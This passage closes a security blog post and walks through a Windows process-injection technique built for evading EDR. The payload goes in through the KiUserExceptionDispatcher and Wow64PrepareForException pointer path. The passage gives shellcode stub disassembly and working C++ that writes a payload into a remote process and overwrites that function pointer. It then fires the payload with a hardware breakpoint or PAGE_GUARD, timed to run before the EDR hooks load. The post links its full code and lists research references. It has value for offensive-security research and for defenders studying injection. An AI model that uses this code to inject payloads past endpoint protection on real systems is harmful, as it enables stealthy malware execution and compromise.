+74: 48 83 c9 ff &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or &nbsp; &nbsp; rcx,0xffffffffffffffff  
+78: 48 89 44 24 20 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;QWORD PTR [rsp+0x20],rax  
+7d: ff d7 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call &nbsp; rdi  
+7f: 33 c9 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp;ecx,ecx  
+81: 48 b8 bb bb bb bb bb &nbsp; &nbsp;movabs rax,0xbbbbbbbbbbbbbbbb     ; shellcodeAddress
+88: bb bb bb  
+8b: ff d0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call &nbsp; rax  
+8d: 33 c0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp;eax,eax  
+8f: 48 83 c4 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp;rsp,0x30  
+93: 5f &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pop &nbsp; &nbsp;rdi  
+94: c3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ret
+</code></pre><p>The raw shellcode stub holds placeholders for the addresses of <code>Wow64PrepareForException</code>, <code>ntdll!NtProtectVirtualMemory</code>, and the address of our payload. We will need to modify the shellcode stub prior to injecting it in the remote process.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stub</span><span class="p">[</span><span class="mi">74</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">NtProtectVirtualMemory</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stub</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">wow64PrepareForException</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stub</span><span class="p">[</span><span class="mi">93</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">wow64PrepareForException</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stub</span><span class="p">[</span><span class="mi">131</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">shellcodeAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">));</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>Next, we write our payload and shellcode stub to the previously allocated memory and write the address of our shellcode stub to the <code>Wow64PrepareForException</code> function pointer.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SIZE_T</span> <span class="n">bytesWritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// write the payload into the allocated memory
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="n">status</span> <span class="o">=</span> <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">processInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="n">shellcodeAddress</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="n">payload</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="n">payloadLength</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">))</span> <span class="o">!=</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">"[-] NtWriteVirtualMemory [1] Failed: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// write the stub into the allocated memory
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="n">status</span> <span class="o">=</span> <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">processInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="n">stubAddress</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="n">stub</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="n">stubSize</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">))</span> <span class="o">!=</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">"[-] NtWriteVirtualMemory [1] Failed: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// write the pointer to the payload into the Wow64PrepareForException function
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="n">status</span> <span class="o">=</span> <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">processInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="n">wow64PrepareForException</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="o">&amp;</span><span class="n">stubAddress</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> 
+</span></span><span class="line"><span class="cl">                                   <span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">))</span> <span class="o">!=</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">"[-] NtWriteVirtualMemory [2] Failed: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>To cause an exception in the remote process, we can again set a hardware breakpoint in the remote process on a function that we know that will execute during the process initialization process or we can set a <code>PAGE_GUARD</code> on the process entry point. Both of these methods will trigger an exception that will eventually trigger the execution of the shellcode stub followed by the execution of the injected payload.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">SetHardwareBreakpoint</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">remoteThread</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD64</span> <span class="n">ntTestAlertAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtTestAlert"</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">CONTEXT</span> <span class="n">context</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_DEBUG_REGISTERS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="p">.</span><span class="n">Dr0</span> <span class="o">=</span> <span class="n">ntTestAlertAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="p">.</span><span class="n">Dr7</span> <span class="o">=</span> <span class="mh">0x00000001</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">remoteThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="n">entryPoint</span> <span class="o">=</span> <span class="n">ReturnRemoteProcessEntryPoint</span><span class="p">(</span><span class="n">processInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">entryPoint</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">processInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">entryPoint</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span> <span class="o">|</span> <span class="n">PAGE_GUARD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><blockquote><p><code>ntdll!NtTestAlert</code> is one of the final functions to be called during process initialization. This guaranties that once we execute the shellcode stub and payload, the base dlls that our payload might need for its functionality will already be loaded in the process. Additionally, it seems that the EDR we are facing initializes its hooking library only after the call to <code>ntdll!NtContinue</code> which is the final call in the initialization process.</p><p>A note of caution: changing the context of a remote thread (like we are doing while setting the hardware breakpoint) is suspicious.</p></blockquote><p>Once we reach this stage, we can resume the process. The process will hit our hook, cause an exception, wind up in <code>ntdll!KiUserExceptionDispatcher</code> where it will call our injected shellcode stub. The shellcode stub will make the <code>Wow64PrepareForException</code> function pointer in <code>.mrdata</code> writable. You might notice that when the process is no longer suspended, <code>.mrdata</code> is set to <code>PAGE_READONLY</code> unlike during the process initialization process when <code>.mrdata</code> is set to <code>PAGE_READWRITE</code>. After that, the shellcode stub will dereference the <code>Wow64PrepareForException</code> function pointer and restore it to its previous state and change back to its original memory protection. Finally, the shellcode stub will call our injected payload and continue execution.</p><p>You can find the code for this example <a href="https://github.com/kr0tt/EarlyExceptionHandling/tree/main/KiUserExceptionDispatcherInjection">here</a>.</p><h2 id="resources">Resources<a href="https://kr0tt.github.io/posts/early-exception-handling/#resources" class="hanchor" arialabel="Anchor">#</a></h2><p>The following are various resources that I used while writing this post. I’m definitely missing some resources that I did not save while writing this post which is uncool and unfortunate :(</p><ul><li><a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel Developer Manuals</a></li><li><a href="http://www.nynaeve.net/?p=200">Skywing’s kernel mode to user mode callbacks series</a></li><li><a href="https://revers.engineering/applied-re-exceptions/">Applied Reverse Engineering: Exceptions and Interrupts</a></li><li><a href="https://wiki.osdev.org/Interrupt_Descriptor_Table">OSDev - Interrupt Descriptor Table</a></li><li><a href="https://doar-e.github.io/blog/2013/10/12/having-a-look-at-the-windows-userkernel-exceptions-dispatcher/">Axel “0vercl0k” Souchet’s blog - Having a look at the Windows’ User/Kernel exceptions dispatcher</a></li><li><a href="https://modexp.wordpress.com/2023/04/19/finding-the-wow64-callback-table/">modexp - WOW64 Callback Table</a></li><li><a href="https://www.ibm.com/think/x-force/using-veh-for-defense-evasion-process-injection">Joshua Magri - You just got vectored</a></li><li><a href="https://mannyfreddy.gitbook.io/ya-boy-manny#fun-with-exception-handlers">mannyfreddy - Fun with Exception Handlers</a></li><li><a href="https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/">Outflank - Early Cascade Injection</a></li></ul></div></div></article></div></div></body></html>
